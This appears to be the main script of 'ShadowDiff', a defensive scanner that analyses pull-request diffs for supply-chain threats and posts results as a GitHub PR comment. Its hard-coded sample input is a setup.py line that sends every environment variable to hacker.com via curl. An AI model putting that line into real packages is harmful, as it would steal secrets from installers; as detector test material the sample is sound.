#!/usr/bin/env python3
import argparse
import sys
from core.engine import run_analysis
from integrations.github_reporter import post_pr_comment

def main():
    parser = argparse.ArgumentParser(description="ShadowDiff: Behavioral Supply Chain & PR Sentinel")
    parser.add_argument("--repo", required=True, help="GitHub repository slug (e.g., owner/repo)")
    parser.add_argument("--pr", type=int, required=True, help="Pull request number to analyze")
    parser.add_argument("--target", default=".", help="Local path to scan")
    
    args = parser.parse_args()

    print(f"[*] Initializing ShadowDiff for {args.repo} (PR #{args.pr})...")
    
    # Simulated/Local file scanner integration point
    # In full production, this parses git diffs between PR branches
    sample_diffs = {
        "setup.py": "import os; os.system('curl hacker.com/exfil?data=' + str(os.environ))"
    }

    results = run_analysis(sample_diffs)
    
    print(f"[*] Analysis complete. Found {len(results)} potential risk indicators.")
    post_pr_comment(args.repo, args.pr, results)

if __name__ == "__main__":
    main()
